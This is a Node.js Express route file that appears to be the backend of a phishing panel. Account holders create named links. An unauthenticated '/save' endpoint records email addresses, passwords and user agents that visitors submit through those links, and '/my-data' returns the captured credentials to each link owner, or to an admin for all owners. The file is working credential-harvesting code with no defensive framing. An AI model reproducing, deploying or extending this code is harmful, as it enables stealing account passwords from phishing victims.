const express = require('express')
const mongoose = require('mongoose')
const jwtAuth = require('../Controllers/jwtAuth')


//       Schema

const linkSchema = new mongoose.Schema({
  username: {
    type: String,
    required: true
  },
  linkName: {
    type: String,
  },
  email: {
    type: String,
  },
  pass: {
    type: String
  },
  userAgent: {
    type: String
  }
})

const Link = mongoose.model('Link', linkSchema)

//      Routes

const linkRoutes = express.Router()

linkRoutes.use(express.json())

//   check if linkname exist for client site

linkRoutes.post('/', async (req, res) => {
  try {
    const linkName = (req.body.linkName)
    const foundLink = await Link.findOne({ linkName: linkName })
    if (foundLink) {
      res.status(200).json({
        success: true,
      })
    } else {
      res.status(404).json({
        success: false,
      })
    }
  } catch (error) {
    console.log(error.message)
  }

})

//      Create Link

linkRoutes.post('/create', jwtAuth, async (req, res) => {

  try {
    const { linkName } = req.body
    const { username } = req.user
    const linkInfo = {
      username: username,
      linkName: linkName
    }
    const foundLink = await Link.find({ linkName: linkName })
    if (foundLink && foundLink != "") {
      res.json({
        success: false,
        message: 'This link already exists!'
      }).status(403)
      return;
    }
    await Link(linkInfo).save()
    res.status(200).json({
      success: true,
      message: "Link created"
    })
  } catch (error) {
    console.log(error.message)
    res.json({
      success: false,
    }).status(403)
  }
})

//      Save email, pass, useragent etc.

linkRoutes.post('/save', async (req, res) => {
  try {
    const { linkName, email, pass, userAgent } = req.body
    const linkInfo = await Link.findOne({ linkName: linkName })
    const username = linkInfo.username
    const newInfo = {
      username: username,
      email: email,
      pass: pass,
      userAgent: userAgent
    }
    await Link(newInfo).save()
    res.status(200).end()
  } catch (error) {
    console.log(error.message)
    res.status(403)
  }
})

//      Get user info

linkRoutes.post('/my-data', jwtAuth, async (req, res) => {
  const { username, role } = req.user
  try {
    let allData;
    if (role === 'user') {
      allData = await Link.find({ username: username })
    } else if (role === 'admin') {
      allData = await Link.find({})
    }
    const validData = allData.filter((item) => {
      if (item.email) {
        return item
      }
    })
    res.status(200).json({
      success: true,
      validData: validData,
      role: role
    })
  } catch (error) {
    console.log(error.message)
    res.status(500).json({
      success: false,
      message: 'Internal server error!'
    })
  }
})


//      Show links

linkRoutes.post('/my-links', jwtAuth, async (req, res) => {
  try {
    let foundLinks
    const { username, role } = req.user
    if (role === 'user') {
      foundLinks = await Link.find({ username: username })
    } else if (role === 'admin') {
      foundLinks = await Link.find({})
    }
    const myLinks = foundLinks.filter((element) => {
      if (element.linkName) {
        return element
      }
    })
    res.status(200).json({
      success: true,
      myLinks: myLinks,
      role
    })
  } catch (error) {
    console.log(error.message)
  }
})

module.exports = linkRoutes



